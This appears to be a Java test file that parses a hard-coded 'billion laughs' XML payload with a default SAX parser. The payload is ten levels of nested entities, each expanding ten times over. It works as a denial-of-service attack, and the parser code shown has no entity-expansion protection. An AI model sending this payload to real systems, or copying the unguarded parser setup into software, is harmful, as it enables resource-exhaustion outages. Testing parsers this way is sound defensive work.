import org.xml.sax.helpers.DefaultHandler;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;

public class TestSAX {


  private static final String xml1 = "<!DOCTYPE test [  <!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\"><!ENTITY lol10 \"&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;\">]><apex:page><h1>|&lol10;|</h1>";

  public static void main(String[] args) {


    SAXParser sp;
    try {
      sp = SAXParserFactory.newInstance().newSAXParser();
      
      XMLReader reader = sp.getXMLReader();
      DefaultHandler h = new DefaultHandler();
      reader.setEntityResolver(h);

      InputStream is = new ByteArrayInputStream(xml1.toString().getBytes("UTF-8"));
      
      
      sp.parse(is, h);
      
    } catch (ParserConfigurationException e) {
      e.printStackTrace();
    } catch (SAXException|IOException e) {
       e.printStackTrace();
    }   
  }
}

